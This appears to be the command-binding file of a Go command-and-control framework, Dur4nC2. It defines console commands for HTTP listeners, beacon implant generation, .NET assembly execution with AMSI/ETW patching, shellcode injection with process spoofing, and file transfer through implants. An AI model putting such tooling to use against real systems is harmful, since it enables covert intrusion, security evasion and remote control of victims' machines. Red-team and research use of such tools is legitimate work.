package command

import (
	"Dur4nC2/server/console"
	"Dur4nC2/server/console/command/beacons"
	"Dur4nC2/server/console/command/exec"
	"Dur4nC2/server/console/command/extensions"
	"Dur4nC2/server/console/command/generate"
	"Dur4nC2/server/console/command/hosts"
	"Dur4nC2/server/console/command/info"
	"Dur4nC2/server/console/command/jobs"
	"Dur4nC2/server/console/command/tasks"
	"Dur4nC2/server/console/command/utils"
	"github.com/desertbit/grumble"
)

const (
	defaultTimeout = 60
)

func BindCommands(con *console.ServerConsoleClient) {
	// *** Jobs ***
	con.App.AddCommand(&grumble.Command{
		Name: JobsStr,
		Help: "Job panel",
		Flags: func(f *grumble.Flags) {
			f.Int("k", "kill", -1, "kill a background job")
			f.Bool("K", "kill-all", false, "kill all jobs")

			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
		},
		Run: func(ctx *grumble.Context) error {
			err := jobs.JobsCmd(ctx, con)
			return err
		},
		HelpGroup: DBQueriesGroup,
	})
	// +++ HTTP listener +++
	con.App.AddCommand(&grumble.Command{
		Name: HttpStr,
		Help: "Start an HTTP listener",
		Flags: func(f *grumble.Flags) {
			f.String("d", "domain", "127.0.0.1", "limit responses to specific domain")
			f.String("L", "lhost", "127.0.0.1", "interface to bind server to")
			f.Int("l", "lport", 8000, "tcp listen port")
			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
			f.Bool("p", "persistent", false, "make persistent across restarts")
		},
		LongHelp: "Example: http -d 192.168.114.147 -L 192.168.114.147 -l 8000",
		Run: func(ctx *grumble.Context) error {
			con.Println()
			err := jobs.HTTPListenerCmd(ctx, con)
			con.Println()
			return err
		},
		HelpGroup: ListenerGeneratorGroup,
	})
	con.App.AddCommand(&grumble.Command{
		Name: StagedHttpStr,
		Help: "Start an staged HTTP listener",
		Flags: func(f *grumble.Flags) {
			//http listener flags
			f.String("d", "domain", "127.0.0.1", "limit responses to specific domain")
			f.String("L", "lhost", "127.0.0.1", "interface to bind server to")
			f.Int("l", "lport", 8000, "tcp listen port")
			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
			f.Bool("p", "persistent", false, "make persistent across restarts")
			//beacon flags
			f.String("N", "name", "", "agent name")
			f.Int64("D", "days", 0, "beacon interval days")
			f.Int64("H", "hours", 0, "beacon interval hours")
			f.Int64("M", "minutes", 0, "beacon interval minutes")
			f.Int64("S", "seconds", 60, "beacon interval seconds")
			f.Int64("J", "jitter", 30, "beacon interval jitter in seconds")
			f.String("o", "os", "windows", "operating system")
			f.String("b", "http", "http://127.0.0.1:8000", "beacon http(s) connection strings")
			f.String("f", "format", "exe", "Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only)")
			f.String("s", "save", "", "directory/file to the binary to")
			f.String("i", "implant", "\"C:\\Users\\Jorge\\GolandProjects\\Dur4nC2\\implant\\\\\"", "absolute path of implant pkg")
		},
		Run: func(ctx *grumble.Context) error {
			con.Println()
			err := jobs.StagedHTTPListenerCmd(ctx, con)
			con.Println()
			return err
		},
		HelpGroup: ListenerGeneratorGroup,
	})
	// *** Generate ***
	con.App.AddCommand(&grumble.Command{
		Name:     BeaconStr,
		Help:     "Generate a beacon binary",
		LongHelp: "beacon -i /home/dur4n/repos/Dur4nC2/implant/ -b http://192.168.114.147:8000",
		Flags: func(f *grumble.Flags) {
			f.String("N", "name", "", "agent name")
			f.Int64("D", "days", 0, "beacon interval days")
			f.Int64("H", "hours", 0, "beacon interval hours")
			f.Int64("M", "minutes", 0, "beacon interval minutes")
			f.Int64("S", "seconds", 60, "beacon interval seconds")
			f.Int64("J", "jitter", 30, "beacon interval jitter in seconds")
			f.String("o", "os", "windows", "operating system")

			f.String("b", "http", "http://127.0.0.1:8000", "http(s) connection strings")
			f.String("f", "format", "exe", "Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only)")
			f.String("s", "save", "", "directory/file to the binary to")
			f.String("i", "implant", "/home/dur4n/repos/Dur4nC2/implant/", "absolute path of implant pkg")
			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
		},
		Run: func(ctx *grumble.Context) error {
			con.Println()
			err := generate.GenerateBeaconCmd(ctx, con)
			con.Println()
			return err
		},
		HelpGroup: ListenerGeneratorGroup,
	})

	// *** Beacons ***
	beaconsCmd := &grumble.Command{
		Name: BeaconsStr,
		Help: "Manage beacons",
		//LongHelp: help.GetHelpFor([]string{BeaconsStr}),
		Flags: func(f *grumble.Flags) {
			f.String("k", "kill", "", "kill a beacon")
			f.Bool("K", "kill-all", false, "kill all beacons")
			f.Bool("F", "force", false, "force killing of the beacon")
			f.String("f", "filter", "", "filter beacons by substring")
			f.String("e", "filter-re", "", "filter beacons by regular expression")

			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
		},
		HelpGroup: DBQueriesGroup,
		Run: func(ctx *grumble.Context) error {
			con.Println()
			err := beacons.BeaconsCmd(ctx, con)
			con.Println()
			return err
		},
	}
	beaconsCmd.AddCommand(&grumble.Command{
		Name: BeaconsUseStr,
		Help: "Switch the active beacon",
		Flags: func(f *grumble.Flags) {
			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
		},
		Args: func(a *grumble.Args) {
			a.String("id", "beacon or session ID", grumble.Default(""))
		},
		Run: func(ctx *grumble.Context) error {
			con.Println()
			err := beacons.BeaconsUseCmd(ctx, con)
			con.Println()
			return err
		},
		//Completer: func(prefix string, args []string) []string {
		//return use.BeaconAndSessionIDCompleter(prefix, args, con)
		//},
		HelpGroup: GenericHelpGroup,
	})
	beaconsCmd.AddCommand(&grumble.Command{
		Name: BeaconsBackgroundStr,
		Help: "Switch to background active beacon",
		Run: func(ctx *grumble.Context) error {
			con.Println()
			beacons.BeaconsBackgroundCmd(ctx, con)
			con.Println()
			return nil
		},
		//Completer: func(prefix string, args []string) []string {
		//return use.BeaconAndSessionIDCompleter(prefix, args, con)
		//},
		HelpGroup: GenericHelpGroup,
	})
	con.App.AddCommand(beaconsCmd)

	// *** System information ***
	con.App.AddCommand(&grumble.Command{
		Name: WhoamiStr,
		Help: "Get session user execution context",
		Flags: func(f *grumble.Flags) {
			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
		},
		Run: func(ctx *grumble.Context) error {
			err := info.WhoamiCmd(ctx, con)
			return err
		},
		HelpGroup: ImplantHelpGroup,
	})

	// *** External extensions ***
	externalModulesCmd := &grumble.Command{
		Name: ExternalExtensionsStr,
		Help: "Manage external extensions",
		Flags: func(f *grumble.Flags) {
			f.Int("t", "timeout", defaultTimeout, "command timeout in seconds")
		},
		Run: func(ctx *grumble.Context) error {
			con.Println()
			err := extensions.ExternalExtensionsCmd(ctx, con)
			con.Println()
			return err
		},
		HelpGroup: ExtensionHelpGroup,
	}
	externalModulesCmd.AddCommand(&grumble.Command{
		Name: InstallExternalExtensionStr,
		Help: "Install a new extension",
		Args: func(a *grumble.Args) {
			a.String("dir-path", "Absolute path of the extension(DLL)", grumble.Default(""))
		},
		Run: func(ctx *grumble.Context) error {
			cmd, err := extensions.ExtensionInstallerCmd(ctx, con)
			con.Println(cmd)
			return err
		},
	})
	externalModulesCmd.AddCommand(&grumble.Command{
		Name: ListExternalExtensionStr,
		Help: "List installed extensions",
		Run: func(ctx *grumble.Context) error {
			err := extensions.ListExtensionsCmd(ctx, con)
			return err
		},
	})
	externalModulesCmd.AddCommand(&grumble.Command{
		Name: RegisterExternalExtensionStr,
		Help: "Register an installed extension into the active beacon",
		Args: func(a *grumble.Args) {
			a.String("extension-name", "Extension name", grumble.Default(""))
		},
		Run: func(ctx *grumble.Context) error {
			_, err := extensions.ExtensionRegisterCmd(ctx, con)
			return err
		},
	})
	externalModulesCmd.AddCommand(&grumble.Command{
		Name: CallExternalExtensionStr,
		Help: "Call a registered extension from the active beacon",
		Flags: func(f *grumble.Flags) {
			f.String("e", "extension-name", "", "Name of the extension to call")
		},
		Args: func(a *grumble.Args) {
			a.StringList("arguments", "extension arguments", grumble.Default([]string{""}))
		},
		Run: func(ctx *grumble.Context) error {
			_, err := extensions.ExtensionCallerCmd(ctx, con)
			return err
		},
	})
	con.App.AddCommand(externalModulesCmd)

	// *** Exec ***
	con.App.AddCommand(&grumble.Command{
		Name: ExecuteAssemblyStr,
		Help: "Execute specified .net assembly in the active implant",
		Flags: func(f *grumble.Flags) {
			f.String("f", "file-path", "", "Absolute path of the .net assembly")
			f.Bool("a", "amsi", false, "AMSI patch")
			f.Bool("e", "etw", false, "ETW patch")
			f.Bool("l", "is-dll", false, "Specify if the binary is a dll")
			f.String("r", "runtime-version", "v4.0.30319", "Runtime version of the .net of the implant host")
			f.String("n", "classname", "", "Specify the classname in case that the assembly is a dll. (Example: ExampleProject.Program)")
			f.String("i", "app-domain", "", "AppDomain name to create for .NET assembly. Generated randomly if not set.")
			f.String("c", "arch", "x86", "Architecture of the implant host")
			f.String("m", "execution-method", "goCLR", "Specify the assembly execution method: ('goCLR': Uses inline-execute assembly module of the implant), ('donut': Generates the shellcode from a assembly using donut and executes it using the shellcode runner module of the implant)")
			f.String("d", "description", "Shellcode execution", "Specify a description for the task")
			f.String("s", "spoofed-process-name", "explorer.exe", "Process name that will be spoofed(Exclusive for 'go-donut' execution mode)")
			f.String("p", "program-path", "", "Program path that will be execute in order to inject the shellcode(Exclusive for 'go-donut' execution mode)")
			f.String("b", "pid", "Process pid", "Specify the process pid(Exclusive for 'donut' method)")
		},
		Args: func(a *grumble.Args) {
			a.StringList("arguments", "List of arguments", grumble.Default([]string{}))
		},
		Run: func(ctx *grumble.Context) error {
			err := exec.ExecuteAssemblyCmd(ctx, con)
			return err
		},
		HelpGroup: ImplantHelpGroup,
	})
	con.App.AddCommand(&grumble.Command{
		Name: ExecuteShellcodeStr,
		Help: "Execute specified shellcode in the active implant",
		Flags: func(f *grumble.Flags) {
			f.String("f", "file-path", "", "Absolute path of the shellcode")
			f.String("s", "spoofed-process-name", "explorer.exe", "Process name that will be spoofed")
			f.String("p", "program-path", "", "Program path that will be execute in order to inject the shellcode")
			f.String("d", "description", "Shellcode execution", "Specify a description for the task")
			f.String("i", "pid", "Process pid", "Specify the process pid(Exclusive for 'sacrificial' method)")
			f.String("m", "method", "spoofed", "Specify the shellcode execution method: ('spoofed': Create a new process spoofing its pid and execute the shellcode into it), ('same': Allocate and execute the shellcode in the implant process), ('sacrificial': Allocate and execute the shellcode into a remote process killing it)")
		},
		Run: func(ctx *grumble.Context) error {
			err := exec.ExecuteShellcodeCmd(ctx, con)
			return err
		},
		HelpGroup: ImplantHelpGroup,
	})

	// *** Tasks ***
	tasksCmd := &grumble.Command{
		Name: TaskStr,
		Help: "Manage stored tasks",
		Flags: func(f *grumble.Flags) {
			f.String("f", "filter", "", "filter beacons by substring")
			f.String("e", "filter-re", "", "filter beacons by regular expression")
		},
		Run: func(ctx *grumble.Context) error {
			err := tasks.TasksCmd(ctx, con)
			return err
		},
		HelpGroup: DBQueriesGroup,
	}
	tasksCmd.AddCommand(&grumble.Command{
		Name: ShowTaskStr,
		Help: "Show the result of a tasks by id",
		Args: func(a *grumble.Args) {
			a.String("task-id", "Task id", grumble.Default(""))
			a.String("file-path", "file path to write the result", grumble.Default(""))
		},
		Run: func(ctx *grumble.Context) error {
			err := tasks.ShowTaskCmd(ctx, con)
			return err
		},
	})
	con.App.AddCommand(tasksCmd)

	// *** Hosts ***
	con.App.AddCommand(&grumble.Command{
		Name: HostStr,
		Help: "Manage stored hosts",
		Flags: func(f *grumble.Flags) {
			f.String("f", "filter", "", "filter beacons by substring")
			f.String("e", "filter-re", "", "filter beacons by regular expression")
		},
		Run: func(ctx *grumble.Context) error {
			err := hosts.HostCmd(ctx, con)
			return err
		},
		HelpGroup: DBQueriesGroup,
	})

	// *** Utils ***
	con.App.AddCommand(&grumble.Command{
		Name: UploadStr,
		Help: "Upload a file in the active implant",
		Flags: func(f *grumble.Flags) {
			f.String("l", "local-file-path", "", "Absolute path of the local file to upload")
			f.String("r", "remote-file-path", "", "Absolute path of the remote file path to upload")
			f.String("d", "description", "Upload", "Description of the task")
		},
		Run: func(ctx *grumble.Context) error {
			err := utils.UploadCmd(ctx, con)
			return err
		},
		HelpGroup: ImplantHelpGroup,
	})
	con.App.AddCommand(&grumble.Command{
		Name: DownloadStr,
		Help: "Upload a file in the active implant",
		Flags: func(f *grumble.Flags) {
			f.String("l", "local-file-path", "", "Absolute path of the local file to upload")
			f.String("r", "remote-file-path", "", "Absolute path of the remote file path to upload")
			f.String("d", "description", "Download", "Description of the task")
		},
		Run: func(ctx *grumble.Context) error {
			err := utils.DownloadCmd(ctx, con)
			return err
		},
		HelpGroup: ImplantHelpGroup,
	})
}
